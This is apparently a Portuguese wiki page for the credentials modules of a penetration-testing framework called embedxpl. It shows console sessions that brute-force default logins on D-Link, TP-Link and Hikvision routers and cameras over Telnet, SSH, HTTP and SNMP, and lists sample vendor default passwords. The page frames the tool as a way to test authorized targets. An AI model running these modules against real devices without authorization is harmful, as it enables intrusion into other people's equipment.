# Modulos de Credenciais

**Idioma:** Portugues (pt-BR) | **English (en-US):** [../en-US/05-creds-modules.md](../en-US/05-creds-modules.md)

---

## Visao geral

Os modulos de credenciais testam interfaces de login **SSH**, **Telnet**, **FTP**, **HTTP Basic/Digest**, **SNMP** e proprietarias de fabricantes em alvos **autorizados**, usando listas de credenciais padrao ou personalizadas.

---

## Fluxo tipico

```text
exf > use creds/routers/dlink/telnet_default_creds
exf (telnet_default_creds) > set target 192.168.1.1
[+] target => 192.168.1.1

exf (telnet_default_creds) > set port 23
exf (telnet_default_creds) > set threads 5
exf (telnet_default_creds) > set stop_on_success true
exf (telnet_default_creds) > run

[*] Executando telnet_default_creds em 192.168.1.1:23
[*] Tentando admin:admin
[*] Tentando admin:1234
[+] SUCESSO: admin:1234 -- shell telnet obtido
```

---

## Opcoes comuns

| Opcao | Tipo | Padrao | Descricao |
|-------|------|--------|-----------|
| `target` | `OptIP` | `""` | Hostname ou IP; aceita `file://caminho` para multi-alvo |
| `port` | `OptPort` | (padrao do protocolo) | Porta do servico |
| `threads` | `OptInteger` | `8` | Numero de threads paralelas |
| `defaults` | `OptBool` | `true` | Testar pares de credenciais padrao do fabricante |
| `stop_on_success` | `OptBool` | `true` | Para apos o primeiro sucesso |
| `verbosity` | `OptBool` | `false` | Exibe todas as tentativas (modo verboso) |
| `timeout` | `OptInteger` | `10` | Timeout por conexao em segundos |

---

## Portas padrao por protocolo

| Protocolo | Porta padrao | Padrao de caminho |
|-----------|-------------|-------------------|
| Telnet | 23 | `creds/routers/<fabricante>/telnet_default_creds` |
| SSH | 22 | `creds/routers/<fabricante>/ssh_default_creds` |
| FTP | 21 | `creds/routers/<fabricante>/ftp_default_creds` |
| HTTP | 80 | `creds/routers/<fabricante>/webinterface_default_creds` |
| SNMP | 161 | `creds/generic/snmp_community_bruteforce` |

---

## Wordlists

Wordlists incluidas ficam em `embedxpl/resources/wordlists/vendors/`, uma por fabricante:

```text
exf (telnet_default_creds) > show wordlists

 Wordlist         URI
──────────────────────────────────────────────────────
 dlink_defaults   file:///...embedxpl/resources/wordlists/vendors/dlink_defaults.txt
```

Para usar uma wordlist personalizada:

```text
exf (telnet_default_creds) > set defaults file:///caminho/para/minha_wordlist.txt
```

Formato da wordlist -- uma entrada por linha, separada por dois-pontos:

```
admin:admin
admin:senha
admin:1234
root:root
```

---

## Exemplos

### Teste SSH (roteador TP-Link)

```text
exf > use creds/routers/tplink/ssh_default_creds
exf (ssh_default_creds) > set target 192.168.0.1
exf (ssh_default_creds) > run
[*] Tentando admin:admin em 192.168.0.1:22
[-] FALHOU: admin:admin
[*] Tentando admin:tplink em 192.168.0.1:22
[+] SUCESSO: admin:tplink -- sessao SSH aberta
```

### Teste HTTP (camera Hikvision)

```text
exf > use creds/cameras/hikvision/webinterface_default_creds
exf (webinterface_default_creds) > set target 192.168.1.100
exf (webinterface_default_creds) > set port 80
exf (webinterface_default_creds) > run
[*] Tentando admin:12345 em http://192.168.1.100:80
[+] SUCESSO: admin:12345 (HTTP 200)
```

### Teste de comunidade SNMP

```text
exf > use creds/generic/snmp_community_bruteforce
exf (snmp_community_bruteforce) > set target 192.168.1.1
exf (snmp_community_bruteforce) > run
[*] Testando comunidade: public
[+] VALIDA: public (get-request SNMPv1 bem-sucedido)
```

### Multi-alvo

```bash
embedxpl -m creds/routers/dlink/telnet_default_creds -s "target file:///tmp/hosts.txt"
```


[Hub da wiki](../README.md)
